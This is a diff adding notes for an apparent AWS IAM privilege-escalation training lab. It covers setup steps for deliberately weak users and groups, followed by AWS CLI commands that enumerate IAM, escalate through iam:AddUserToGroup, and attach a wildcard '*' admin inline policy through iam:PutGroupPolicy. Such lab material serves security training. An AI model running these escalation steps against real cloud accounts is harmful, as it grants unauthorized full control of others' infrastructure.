@@ -1,0 +1,77 @@
+1- create an IAm user with iam:AddUserToGroup to group policy
+2- create a group with iam:PutGroupPolicy
+3 - create a group with permissions to access lambda
+3 - create 2 S3 buckets with some random data
+4 - create 2 users attached already to the above groups
+5 - create an EC2 instance
+
+dependent terraform to be created seperately - containing some buckets, ec2, lambda and rds - common for all labs
+ 
+ 
+ 
+ 
+
+Target 1: list all the S3 buckets using iam:AddUserToGroup
+Target 2: list ec2 instances in aws by priv escalation iam:PutGroupPolicy
+ Commands:
+
+
+aws sts get-caller-identity --profile seasides-victim
+aws s3 ls
+----------user-enum----------------------------
+aws iam list-users --profile seasides-victim
+aws iam list-attached-user-policies --user-name seasides-victim --profile seasides-victim
+aws iam get-policy --policy-arn arn:aws:iam::159030386263:policy/seasides-victimuser --profile seasides-victim
+aws iam get-policy-version --policy-arn arn:aws:iam::159030386263:policy/seasides-victimuser --version-id v1 --profile seasides-victim
+------------------group-enum-------------------------
+aws iam list-groups --profile seasides-victim
+aws iam get-group --group-name seasides-group01 --query "Users[].UserName" --output text --profile seasides-victim
+aws iam get-group --group-name seasides-group02 --query "Users[].UserName" --output text --profile seasides-victim
+
+aws iam list-attached-group-policies --group-name seasides-group01 --profile seasides-victim
+aws iam get-policy --policy-arn arn:aws:iam::159030386263:policy/dev-group-policy --profile seasides-victim
+aws iam get-policy-version --policy-arn arn:aws:iam::159030386263:policy/dev-group-policy --version-id v1 --profile seasides-victim
+
+aws iam list-attached-group-policies --group-name seasides-group02 --profile seasides-victim
+aws iam get-policy --policy-arn arn:aws:iam::159030386263:policy/prod-group-access --profile seasides-victim
+aws iam get-policy-version --policy-arn arn:aws:iam::159030386263:policy/prod-group-access --version-id v1 --profile seasides-victim
+
+----------------priv-esc-01-adduser-to-group------------------------------------------
+aws iam add-user-to-group --group-name seasides-group02 --user-name seasides-victim --profile seasides-victim
+aws s3 ls --profile seasides-victim
+aws iam get-group --group-name seasides-group02 --query "Users[].UserName" --output text --profile seasides-victim
+---------------------priv-esc-02-putgroup-policy---------------------------------------
+aws ec2 describe-instances --region <region> --profile seasides-victim
+
+nano admin-policy.json
+
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": "*",
+            "Resource": "*"
+        }
+    ]
+}
+
+aws iam put-group-policy --group-name group_i_am_in --policy-name group_inline_policy --policy-document file://./admin-policy.json --profile seasides-victim
+
+aws ec2 describe-instances
+
+Customer managed policies:
+
+aws iam list-attached-group-policies --group-name seasides-group02 --profile seasides-victim
+aws iam get-policy --policy-arn arn:aws:iam::159030386263:policy/prod-group-access --profile seasides-victim
+aws iam get-policy-version --policy-arn arn:aws:iam::159030386263:policy/prod-group-access --version-id v1 --profile seasides-victim
+
+
+Inline group policies:
+aws iam list-group-policies --group-name seasides-group02 --profile seasides-victim
+aws iam get-group-policy --group-name seasides-group02 --policy-name prod-group-access
+
+----------------------------------------------------------------------------------------------------
+Delete this before terraform destroy
+ aws iam delete-group-policy --group-name seasides-group-02 --policy-name group_inline_policy --profile seasides-victim-02
+
